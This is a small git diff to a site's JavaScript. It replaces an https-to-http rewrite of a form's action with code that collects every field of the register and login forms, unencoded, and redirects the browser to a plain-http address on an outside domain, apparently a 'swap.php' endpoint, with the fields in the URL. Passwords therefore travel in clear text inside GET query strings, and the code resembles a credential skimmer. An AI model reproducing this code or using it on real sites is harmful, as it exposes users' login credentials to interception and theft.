@@ -32,6 +32,18 @@ function accountMan() {
 
 function checkForm(ee,ii) {
 	event.preventDefault();
-	ee.setAttribute('action',ee.getAttribute('action').replace('https','http'));
-	ee.submit();
+	
+	if(ii=="register") {
+	action="http://request.bleedingedgelab.co.za/swap.php?swap=register"
+	} else if(ii=="login") {
+	action="http://request.bleedingedgelab.co.za/swap.php?swap=login"	
+	
+	}
+	string = "";
+	ins = ee.getElementsByTagName('input');
+	for(let i = 0; i<ins.length; i++) {
+		string += '&' + ins[i].getAttribute('name') + '=' + ins[i].value;
+	}
+	
+	location = action + string;
 }
